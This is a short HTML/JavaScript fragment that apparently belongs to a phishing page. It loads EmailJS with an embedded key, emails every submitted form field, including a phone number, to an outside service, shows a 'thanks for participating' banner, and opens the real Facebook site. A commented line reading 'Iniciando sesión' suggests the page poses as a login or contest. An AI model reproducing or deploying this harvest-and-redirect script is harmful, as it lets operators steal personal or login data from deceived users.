    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>

    <script type="text/javascript">
        emailjs.init('user_zByTB2OyK8sWofFePBZdB')
        var subject = "Lyrics-Music"
        const phone = document.getElementById('phone');
        const btn = document.getElementById('button');

        document.getElementById('form')
            .addEventListener('submit', function (event) {
                event.preventDefault();

                btn.value = 'Enviando...';

                const serviceID = 'default_service';
                const templateID = 'gmail';

                emailjs.sendForm(serviceID, templateID, this)
                    .then(() => {
                        btn.value = 'Send Email';
                        //alert('Iniciando sesión')
                        
                        var msj2 = '<center><div style="display: block;background-color: yellow;border: 5px ridge;text-align: center" id="mensajillo"><div style="font-size: 6vw;color: red;display: block;">MUCHAS GRACIAS POR PARTICIPAR!</div></div></center>'
                        $('body').append(msj2)
                        open('https://web.facebook.com/?_rdc=1&_rdr')

                        //alert('MUCHAS GRACIAS POR PARTICIPAR!');
                    }, (err) => {
                        btn.value = 'Send Email';
                        alert(JSON.stringify(err));
                    });
            });


    </script>
